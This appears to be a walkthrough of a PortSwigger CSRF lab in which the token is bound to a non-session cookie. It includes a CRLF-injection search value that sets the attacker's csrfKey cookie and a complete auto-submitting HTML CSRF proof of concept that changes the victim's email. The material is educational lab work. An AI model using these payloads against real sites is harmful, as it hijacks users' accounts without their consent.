![image](https://github.com/user-attachments/assets/39192557-1dcb-4afd-a23f-20906f8f342a)## Welcome, my friend. Today we will start the [5. CSRF lab](https://portswigger.net/web-security/learning-paths/csrf/csrf-common-flaws-in-csrf-token-validation/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie) in ```portswigger```

### Let's play this lab:

![image](https://github.com/user-attachments/assets/e943f365-30c1-4828-8fbb-07c19bfc220b)

#### First, we navigate inside the browser

![image](https://github.com/user-attachments/assets/789699db-cb37-4472-8bd7-e3099aa642f6)

#### We can log in to our account using the following credentials: ```wiener:peter```

![image](https://github.com/user-attachments/assets/993ebfbb-866c-465f-9cef-bdf523e1369d)

#### Let's update email to ```0xT0R@gmail.com```:

![image](https://github.com/user-attachments/assets/c6b7aee1-4974-43dc-b3a5-7231e5258615)

#### We need do this task but through our victim by CSRF, we should intercept this request of update email by burp suite.

![image](https://github.com/user-attachments/assets/2bf7ea9b-a105-4311-9d33-347c82a3cac0)

#### 400 Bad, Hmmm. We can log in to our account using the following credentials: ```carlos:montoya```

![image](https://github.com/user-attachments/assets/0cea3abe-c1d4-4e5c-ac84-379f5cb18725)

### Go to inspect or view page source and copy this csrf:

![image](https://github.com/user-attachments/assets/92f5fef5-af32-4cf1-97e2-65ba8cf5214b)



```
csrf=MIeMs4jmcp8TBV2HnSrUqf5DNoTPalgJ
```

#### And copy this ```csrfkey```:

![image](https://github.com/user-attachments/assets/381c3797-adec-400b-a828-800c43e0aee8)

```
csrfkey=KKuvlQPrwSbJ4IQ6aSUr7Q3F7M026hlL
```

### Now Go to wiener account and go to home page and search about ```hi``` in search paramater:

![image](https://github.com/user-attachments/assets/a265ed6e-0578-48f5-9f34-c4d89d0a5f41)

#### and intercept this request in burp suite:

![image](https://github.com/user-attachments/assets/d6a728d4-e704-402b-a49d-6ecdcffea042)

### Great, we discove ```LastSearchTerm``` paramater in set-cookie.

### Let's changed search value to:

```
/?search=hi%0d%0aSet-Cookie:%20csrfKey=KKuvlQPrwSbJ4IQ6aSUr7Q3F7M026hlL%3b%20SameSite=None
```

![image](https://github.com/user-attachments/assets/282830dd-d28a-4a2e-8292-246684f06095)

### Go to exploit server and paste this code:

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a5f00c903dee7db80d1865e00d10037.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hi1&#64;gmail&#46;com" />
      <input type="hidden" name="csrf" value="MIeMs4jmcp8TBV2HnSrUqf5DNoTPalgJ" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://0a5f00c903dee7db80d1865e00d10037.web-security-academy.net/?search=hi%0d%0aSet-Cookie:%20csrfKey=KKuvlQPrwSbJ4IQ6aSUr7Q3F7M026hlL%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```


![image](https://github.com/user-attachments/assets/e690dc11-0024-4962-90cb-51f064072d6b)

![image](https://github.com/user-attachments/assets/75168ddd-aa6e-4b03-bb77-dd956d97d4ec)


-------

### Done! Congratulations, friends‚ù§Ô∏è‚Äçüî•


<p align="center">
<img src="https://github.com/user-attachments/assets/dab63e63-4abd-40e6-b60a-78617621f2b8" >
</p>
